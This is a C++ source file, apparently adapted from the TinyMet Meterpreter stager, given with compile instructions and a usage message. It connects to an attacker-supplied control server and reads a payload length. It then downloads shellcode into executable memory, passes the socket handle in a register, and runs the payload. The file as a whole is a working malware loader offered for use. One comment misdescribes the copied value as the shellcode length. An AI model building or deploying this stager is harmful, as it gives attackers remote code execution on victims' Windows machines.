// This code is based on the TinyMet Meterpreter stager
// Compile with g++ on Windows:
// g++ tinymet.cpp -lws2_32 -lwininet

#include <WinSock2.h>
#include <Wininet.h>
#include <Windows.h>
#include <stdio.h>


// Global variables
unsigned long hostip;
unsigned short portnumber;
unsigned char *buf;
unsigned int bufsize;

char* LHOST;
char* LPORT;
char helptext[] = "Usage:\n\n"
"tiny.exe LHOST LPORT\n"
"\nExample:\n"
"\"tiny.exe 10.10.10.10 443\"\n";

// download shellcode from C2 server
unsigned char* get_shellcode(char* host, char* port){
	WSADATA wsaData;
	SOCKET sckt;
	SOCKET cli_sckt;
	SOCKET buffer_socket;

	struct sockaddr_in server;
	hostent *hostName;
	int length = 0;
	int location = 0;

	// initialize winsock
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0){
		printf("Unable to initialize winsock");
		exit(1);
	}

	// get server hostname
	hostName = gethostbyname(host);
	if (hostName == nullptr){
		printf("Unable to get hostname");
		exit(1);
	}

	// resolve hostname to IP address
	hostip = *(unsigned long*)hostName->h_addr_list[0];
	portnumber = htons(atoi(port));

	// setup socket
	server.sin_addr.S_un.S_addr = hostip;
	server.sin_family = AF_INET;
	server.sin_port = portnumber;

	sckt = socket(AF_INET, SOCK_STREAM, NULL);
	if (sckt == INVALID_SOCKET){
		printf("Unable to create socket");
		exit(1);
	}

	// connect to C2 server
	if (connect(sckt, (sockaddr*)&server, sizeof(server)) != 0){
		printf("Unable to connect to remote server");
		exit(1);
	}
	buffer_socket = sckt;

	// get shellcode size by reading first 4 bytes
	recv(buffer_socket, (char*)&bufsize, 4, 0);
	buf = (unsigned char*)VirtualAlloc(NULL, bufsize + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// get socket number
	// 0xbf is the opcode for: move edi, imm32
	buf[0] = 0xbf;

	// copy shellcode length to buf
	memcpy(buf + 1, &buffer_socket, 4);

	// read shellcode from socket and store in buf
	length = bufsize;
	while (length != 0){
		int received = 0;
		received = recv(buffer_socket, ((char*)(buf + 5 + location)), length, 0);
		location = location + received;
		length = length - received;
	}
	return buf;
}

int main(int argc, char *argv[]){

	if (argc != 3) { 
		printf(helptext);
		exit(-1);
	}

	LHOST = argv[1];
	LPORT = argv[2];

	printf("Connecting to control server: %s:%s\n", LHOST, LPORT);
	buf = get_shellcode(LHOST, LPORT);

	// execute shellcode located at the address of buf in memory
	(*(void(*)())buf)();
	exit(0);
}
